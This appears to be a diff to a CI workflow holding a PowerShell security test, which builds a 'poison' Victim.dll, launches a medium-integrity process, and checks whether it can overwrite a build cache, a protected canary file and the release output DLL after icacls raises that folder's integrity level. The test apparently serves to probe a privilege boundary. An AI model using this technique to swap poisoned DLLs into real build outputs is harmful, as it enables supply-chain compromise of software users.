@@ -58,6 +58,9 @@ jobs:
           $entry = $entries[0].FullName
           $key = $entries[0].Directory.Name
           Write-Host "EXACT_KEY=$key"
+          & icacls.exe $victim /setintegritylevel "(OI)(CI)H" /T
+          $outputDll = Join-Path $victim "bin\Release\net11.0\Victim.dll"
+          Write-Host "OUTPUT_ACL=$(icacls.exe $outputDll | Out-String)"
           Invoke-Dotnet @('build', $poison, '-c', 'Release', '-v:q')
           $poisonDll = Join-Path $poison 'bin\Release\net11.0\Victim.dll'
           $canary = Join-Path $root 'protected-canary.txt'
@@ -67,7 +70,7 @@ jobs:
           $lowScript = Join-Path $root 'medium.ps1'
           $lowResult = Join-Path $root 'medium-result.json'
           @'
-          param([string]$CacheAssembly, [string]$PoisonDll, [string]$Canary, [string]$Result)
+          param([string]$CacheAssembly, [string]$PoisonDll, [string]$Canary, [string]$OutputDll, [string]$Result)
           $groupText = (whoami /groups | Out-String)
           $data = [ordered]@{
             identity = (whoami)
@@ -75,6 +78,8 @@ jobs:
             highIntegrity = $groupText.Contains('S-1-16-12288')
             cacheWrite = $false
             canaryWrite = $false
+            outputWrite = $false
+            outputError = ""
             cacheError = ''
             canaryError = ''
           }
@@ -82,6 +87,8 @@ jobs:
           catch { $data.cacheError = $_.Exception.Message }
           try { Set-Content -LiteralPath $Canary -Value 'LOW_WRITE'; $data.canaryWrite = $true }
           catch { $data.canaryError = $_.Exception.Message }
+          try { Copy-Item -LiteralPath $PoisonDll -Destination $OutputDll -Force; $data.outputWrite = $true }
+          catch { $data.outputError = $_.Exception.Message }
           $data | ConvertTo-Json -Compress | Set-Content -LiteralPath $Result
           '@ | Set-Content -LiteralPath $lowScript
           Add-Type -TypeDefinition @'
@@ -141,7 +148,7 @@ jobs:
             }
           }
           '@
-          $lowCommand = '"' + $env:WINDIR + '\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -NonInteractive -ExecutionPolicy Bypass -File ' + $lowScript + ' -CacheAssembly ' + $entry + ' -PoisonDll ' + $poisonDll + ' -Canary ' + $canary + ' -Result ' + $lowResult
+          $lowCommand = '"' + $env:WINDIR + '\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -NonInteractive -ExecutionPolicy Bypass -File ' + $lowScript + ' -CacheAssembly ' + $entry + ' -PoisonDll ' + $poisonDll + ' -Canary ' + $canary + ' -OutputDll ' + $outputDll + ' -Result ' + $lowResult
           try { $lowPid = [MediumTokenLauncher]::Launch($lowCommand); Write-Host "MEDIUM_LAUNCH_PID=$lowPid" }
           catch { Write-Host "MEDIUM_LAUNCH_ERROR=$($_.Exception.Message)" }
           for ($i = 0; $i -lt 40 -and -not (Test-Path $lowResult); $i++) { Start-Sleep -Milliseconds 500 }
@@ -149,7 +156,7 @@ jobs:
           if (Test-Path $lowResult) {
             $low = Get-Content -LiteralPath $lowResult -Raw | ConvertFrom-Json
             Write-Host "MEDIUM_RESULT=$($low | ConvertTo-Json -Compress)"
-            if ($low.mediumIntegrity -and $low.cacheWrite -and -not $low.canaryWrite) { $actor = 'medium-same-SID' }
+            if ($low.mediumIntegrity -and $low.cacheWrite -and -not $low.canaryWrite -and -not $low.outputWrite) { $actor = 'medium-same-SID' }
           } else {
             Write-Host 'MEDIUM_RESULT=unavailable'
           }
